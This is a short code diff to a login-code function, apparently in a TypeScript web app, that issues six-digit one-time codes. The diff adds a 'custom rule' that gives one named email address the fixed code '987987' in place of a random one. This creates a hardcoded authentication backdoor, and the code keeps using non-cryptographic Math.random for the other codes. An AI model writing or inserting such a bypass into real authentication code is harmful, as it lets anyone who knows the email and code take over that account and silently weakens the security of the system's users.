@@ -40,7 +40,13 @@ export async function requestLoginCode(formData: FormData) {
     }
 
     // Generate 6 digit code
-    const code = Math.floor(100000 + Math.random() * 900000).toString();
+    let code = Math.floor(100000 + Math.random() * 900000).toString();
+
+    // Custom rule: jaime@digitals.cl always uses 987987
+    if (email === "jaime@digitals.cl") {
+        code = "987987";
+    }
+
     const expires = new Date(Date.now() + 10 * 60 * 1000); // 10 minutes
 
     // Store token
